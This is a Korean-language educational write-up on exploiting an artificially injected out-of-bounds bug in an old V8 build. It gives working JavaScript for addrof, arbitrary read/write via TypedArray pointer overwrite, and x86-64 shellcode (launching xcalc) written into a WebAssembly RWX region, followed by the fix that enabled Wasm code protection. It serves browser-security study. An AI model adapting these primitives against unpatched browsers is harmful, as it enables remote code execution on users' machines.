# V8 OOB Exploitation (Chromium < 100.0.4896.60, V8 < 10.0.136)

## Setup

- Ubuntu 20.04.6 LTS (WSL)
- [7c369ec82136ac0afc559aaa0b31614840fcc0a0](https://chromium.googlesource.com/v8/v8.git/+/7c369ec82136ac0afc559aaa0b31614840fcc0a0) (2022.02.15.)

[oob.diff](./oob.diff)는 out of bounds 버그가 발생한 상황을 simulate하기 위해 array의 length를 임의로 더 크게 설정해도 array가 확장되지 않도록 하고, [dcheck.diff](./dcheck.diff)는 debug build에서 exploit을 진행할 때 crash가 발생하지 않도록 debug check를 제거한다.

```bash
# install depot_tools
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git ~/depot_tools
echo "export PATH=\$HOME/depot_tools:\$PATH" >> ~/.zshrc
echo "export NINJA_SUMMARIZE_BUILD=1" >> ~/.zshrc
source ~/.zshrc

# get v8
mkdir ~/v8
git clone https://chromium.googlesource.com/v8/v8.git ~/v8/v8
cd ~/v8/v8
git checkout 7c369ec82136ac0afc559aaa0b31614840fcc0a0
git apply oob.diff
git apply dcheck.diff

# sync submodules
cd ..
echo 'solutions = [
  {
    "name": "v8",
    "url": "https://chromium.googlesource.com/v8/v8.git",
    "deps_file": "DEPS",
    "managed": False,
    "custom_deps": {},
  },
]' > .gclient
gclient sync -D

# install dependencies
cd v8
./build/install-build-deps.sh
sudo apt install -y ninja-build

# build v8
gn gen out/debug --args='is_component_build=false v8_optimized_debug=false'
gn gen out/release --args='is_debug=false'
autoninja -C out/debug d8
autoninja -C out/release d8

# install gdb plugin
echo "source $HOME/v8/v8/tools/gdbinit" >> ~/.gdbinit

# wabt
git clone --recursive https://github.com/WebAssembly/wabt ~/wabt
cd ~/wabt
git submodule update --init
mkdir build
cd build
cmake ..
cmake --build .
```

## Exploitation

### Generate OOB array

```js
// flags: --allow-natives-syntax --shell

let oob_arr = [1.1];

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${oob_arr.length}`);

% DebugPrint(oob_arr);
```

![image](https://github.com/user-attachments/assets/0c026f75-416f-457d-9eb5-5c21d6fba367)

![image](https://github.com/user-attachments/assets/6784d512-0b29-4fa8-9336-306b9379c0fc)

![image](https://github.com/user-attachments/assets/f3b332a7-9f3b-4bfd-97f1-d2eb2bb71328)

`oob_arr`은 한 개의 double을 저장할 수 있는 공간만 가지고 있지만, 버그를 발생시켜 length를 증가시켰기 때문에 자유로운 OOB read/write가 가능하다.

![image](https://github.com/user-attachments/assets/9263e13c-06ad-4c58-b3eb-dcfdffbd940e)

### Helper functions

```js
let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}
```

### Get address of arbitrary object

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(obj_arr);
```

함수 내부에서 `oob_arr`과 `obj_arr`을 연속해서 정의하면 메모리 상에서 인접한 위치에 할당된다. 따라서 `oob_arr`을 통해 `obj_arr`의 메모리에 접근하여 값을 읽고 쓸 수 있다.

![image](https://github.com/user-attachments/assets/69116bc9-f203-4ddf-9462-de74722367c5)

![image](https://github.com/user-attachments/assets/d8fbee66-8bf4-446f-abc1-031de647c244)

![image](https://github.com/user-attachments/assets/3d91cc6e-e2f8-43bc-a3f3-1a863892a178)

```js
// get (compressed) address of |obj|
function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(oob_arr[4]) & 0xffffffffn;
}

// addrof test
let tmp_obj_addr = addrof(tmp_obj);
console.log(`[+] tmp_obj_addr == ${hex(tmp_obj_addr)}`);
```

![image](https://github.com/user-attachments/assets/d35b32e8-c778-4982-89de-91a31c70f33a)

### Get base address of virtual memory cage

```js
(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(typed_arr);
```

![image](https://github.com/user-attachments/assets/5365c810-2f1e-4262-b4fb-8fe34df1ae1a)

![image](https://github.com/user-attachments/assets/f5667128-15d6-4023-9705-624b5d738064)

![image](https://github.com/user-attachments/assets/3493d4db-de6a-40cc-83c3-da9c8e06fa05)

`TypedArray`의 `external_pointer`를 leak하여 virtual memory cage의 base address를 얻을 수 있다.

```js
// get v8 base
let v8_base = ftoi(oob_arr[22]) & 0xffffffff00000000n;
console.log(`[+] v8_base == ${hex(v8_base)}`);
```

![image](https://github.com/user-attachments/assets/02d79eef-bb80-4437-b2d6-66d3a629d9ad)

### Arbitrary address read/write

```js
let oob_arr;
let obj_arr;
let tmp_obj = {};
let typed_arr;

(function layout() {
    oob_arr = [1.1];
    obj_arr = [tmp_obj];
    typed_arr = new BigUint64Array(1);
})();

// generate oob array
oob_arr.length = 0x1000;
console.log(`[+] oob_arr.length == ${hex(oob_arr.length)}`);

% DebugPrint(oob_arr);
% DebugPrint(typed_arr);
```

![image](https://github.com/user-attachments/assets/7f91ee22-ab30-4969-b4df-c3444b77cafb)

![image](https://github.com/user-attachments/assets/9ebc3192-50cd-4095-a19a-cfac4557441b)

`TypedArray`의 `base_pointer`와 `external_pointer`의 합(`data_ptr`)은 첫 번째 element가 저장된 주소가 된다.

![image](https://github.com/user-attachments/assets/a0db44c1-e23d-4928-8a01-8056966beaa3)

OOB를 이용하여 `base_pointer`와 `external_pointer`를 조작하면 임의의 주소에 접근하여 값을 읽거나 쓸 수 있다.

```js
// arbitrary address read/write
function aarw(addr, value = null) {
    oob_arr[22] = itof(addr); // external_pointer of |typed_arr|
    oob_arr[23] = itof(0n); // base_pointer of |typed_arr|
    if (value == null) {
        // if |value| is null, read 8 bytes from |addr|
        return typed_arr[0];
    } else {
        // if |value| isn't null, write |value| to |addr|
        typed_arr[0] = value;
    }
}
```

```js
// aar test
let tmp_obj_addr = v8_base + addrof(tmp_obj);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/5579beb5-a0dd-4282-a729-3b9ddf090101)

![image](https://github.com/user-attachments/assets/1de1296d-8ab9-4353-8133-4859412472b9)

```js
// aaw test
aarw(tmp_obj_addr - 1n, 0x4141414141414141n);
console.log(`[+] *${hex(tmp_obj_addr - 1n)} == ${hex(aarw(tmp_obj_addr - 1n))}`);
```

![image](https://github.com/user-attachments/assets/f4eae188-24e2-46a7-b8a3-4941b4195cfb)

![image](https://github.com/user-attachments/assets/fccc2292-169c-468f-aaf3-49ff4dc64c51)

### Allocate RWX region

`WebAssembly.Instance`를 생성하면 Wasm module의 exported function을 실행하기 위해 RWX permission을 가진 메모리 영역이 할당된다.

```bash
echo "(module (func \$main) (export \"main\" (func \$main)))" > pwn.wat
~/wabt/bin/wat2wasm pwn.wat # output: pwn.wasm
```

![image](https://github.com/user-attachments/assets/95c514d5-e7e5-499b-8b93-438e9e369d17)

```js
// allocate rwx region
let wasm_code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x04, 0x01, 0x60, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07, 0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b]);
let wasm_module = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_module);

% DebugPrint(wasm_instance);
```

![image](https://github.com/user-attachments/assets/fc3b39b8-d7fa-4612-b507-73f0e659f696)

![image](https://github.com/user-attachments/assets/a035543f-7cbc-4ed9-a128-9878924265ff)

```js
// get address of rwx region
let wasm_instance_addr = v8_base + addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);
let rwx = aarw(wasm_instance_addr - 1n + 0x60n);
console.log(`[+] rwx == ${hex(rwx)}`);
```

![image](https://github.com/user-attachments/assets/e1625ddb-46d9-43a8-88df-f8ce02ee838a)

![image](https://github.com/user-attachments/assets/7af33e5c-588a-4fc5-8e7e-ebe33f0b7289)

### Execute shellcode

AAW를 이용하여 RWX 영역에 shellcode를 쓰고 Wasm의 exported function을 호출하면 shellcode가 실행된다.

[shellcode.py](./shellcode.py)

```shell
$ python3 shellcode.py
[0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5]
```

```js
// execve("/bin/xcalc", 0, ["DISPLAY=:0", 0])
let shellcode = [0x48, 0xc7, 0xc0, 0x6c, 0x63, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x78, 0x63, 0x61, 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x0, 0x0, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48, 0x89, 0xe0, 0x48, 0xc7, 0xc3, 0x0, 0x0, 0x0, 0x0, 0x53, 0x50, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0xf, 0x5];

// write shellcode to rwx region
console.log("[+] Writing shellcode...");
for (let i = 0; i < shellcode.length / 8; i++) {
    let value = 0n;
    for (let j = 0; j < 8; j++) {
        try {
            value += BigInt(shellcode[i * 8 + j]) << BigInt(j * 8);
        } catch (e) { }
    }
    aarw(rwx + BigInt(i * 8), value);
}
```

![image](https://github.com/user-attachments/assets/7dd9ae3f-06be-4064-8fc8-407d0aab6fd4)

![image](https://github.com/user-attachments/assets/884a3c3e-3715-406d-be35-dd052ef6d629)

```js
// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main();
```

[pwn.js](./pwn.js)

![image](https://github.com/user-attachments/assets/924dedfb-59f7-4448-956f-6019c71eaef7)

## Patch

> [[wasm] Ship code protection via memory protection keys](https://chromium.googlesource.com/v8/v8.git/+/17b46632cba261c1eb9c87347a05867079e6a7b9) (2022.02.15.)

```diff
diff --git a/src/flags/flag-definitions.h b/src/flags/flag-definitions.h
index f442c86..7e2e433 100644
--- a/src/flags/flag-definitions.h
+++ b/src/flags/flag-definitions.h
@@ -940,10 +940,9 @@
 DEFINE_BOOL(wasm_write_protect_code_memory, false,
             "write protect code memory on the wasm native heap with mprotect")
 DEFINE_WEAK_IMPLICATION(future, wasm_write_protect_code_memory)
-DEFINE_BOOL(wasm_memory_protection_keys, false,
-            "protect wasm code memory with PKU if available, no protection "
-            "without support; fallback to mprotect by adding "
-            "--wasm-write-protect-code-memory")
+DEFINE_BOOL(wasm_memory_protection_keys, true,
+            "protect wasm code memory with PKU if available (takes precedence "
+            "over --wasm-write-protect-code-memory)")
 DEFINE_WEAK_IMPLICATION(future, wasm_memory_protection_keys)
 DEFINE_DEBUG_BOOL(trace_wasm_serialization, false,
                   "trace serialization/deserialization")
```

Wasm code protection이 적용되어, 이제 `WebAssemblyInstance`를 생성할 때 할당되는 RWX 영역에 값을 쓰려고 시도하면 segmentation fault가 발생한다.